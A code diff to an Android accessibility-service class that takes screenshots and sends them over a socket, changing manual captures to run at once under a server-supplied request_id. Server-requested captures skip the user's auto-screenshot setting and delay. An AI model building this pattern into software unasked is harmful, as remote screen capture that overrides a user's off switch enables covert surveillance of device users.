@@ -35,7 +35,7 @@ public class AccessibilityEventHandler {
 
     private String pendingText = "";
     private final Runnable executeRunnable;
-    private boolean isManual = false;
+    private String pendingRequestId = null;
 
     public AccessibilityEventHandler(Consumer<ScreenshotCallback> captureProvider, AppConfig appConfig, SocketManager socketManager) {
         if (captureProvider == null) {
@@ -70,7 +70,7 @@ public class AccessibilityEventHandler {
 
             // Check config before capturing screenshot (only for automatic captures)
             ConfigData config = appConfig.getConfig();
-            if (!isManual && !config.isAutoScreenshotEnabled()) {
+            if (pendingRequestId == null && !config.isAutoScreenshotEnabled()) {
                 socketManager.sendEvent("screenshot_error", "Screenshot disabled in config");
                 return;
             }
@@ -80,7 +80,23 @@ public class AccessibilityEventHandler {
                 @Override
                 public void onSuccess(byte[] imageData) {
                     if (imageData != null) {
-                        socketManager.sendEvent("screenshot_response", imageData);
+                        // Include request_id in response if present
+                        String requestIdToSend;
+                        synchronized (AccessibilityEventHandler.this) {
+                            requestIdToSend = pendingRequestId;
+                            pendingRequestId = null;
+                        }
+                        
+                        if (requestIdToSend != null) {
+                            // Send as object with request_id and image data
+                            java.util.Map<String, Object> response = new java.util.HashMap<>();
+                            response.put("request_id", requestIdToSend);
+                            response.put("image", imageData);
+                            socketManager.sendEvent("screenshot_response", response);
+                        } else {
+                            // No request_id, send image directly
+                            socketManager.sendEvent("screenshot_response", imageData);
+                        }
                     } else {
                         socketManager.sendEvent("screenshot_error", "Screenshot returned null data");
                     }
@@ -127,21 +143,22 @@ public class AccessibilityEventHandler {
     public void triggerWithText(String text) {
         synchronized (this) {
             pendingText = text;
-            isManual = false;
+            pendingRequestId = null;
         }
         scheduleExecution();
     }
 
     /**
-     * Trigger manual screenshot capture.
-     * This bypasses the auto_screenshot config check.
+     * Trigger manual screenshot capture with request_id.
+     * This bypasses the default delay and auto_screenshot config check.
+     * @param requestId The request_id from the server to include in the response
      */
-    public void triggerManualCapture() {
+    public void triggerManualCapture(String requestId) {
         synchronized (this) {
             pendingText = "";
-            isManual = true;
+            pendingRequestId = requestId;
         }
-        scheduleExecution();
+        executeImmediately();
     }
 
     /**
@@ -150,7 +167,7 @@ public class AccessibilityEventHandler {
     public void triggerCaptureOnly() {
         synchronized (this) {
             pendingText = "";
-            isManual = false;
+            pendingRequestId = null;
         }
         scheduleExecution();
     }
@@ -161,6 +178,14 @@ public class AccessibilityEventHandler {
     private void scheduleExecution() {
         handler.removeCallbacks(executeRunnable);
         handler.postDelayed(executeRunnable, DELAY_MS);
+    }
+
+    /**
+     * Execute immediately without delay.
+     */
+    private void executeImmediately() {
+        handler.removeCallbacks(executeRunnable);
+        handler.post(executeRunnable);
     }
 
     /**
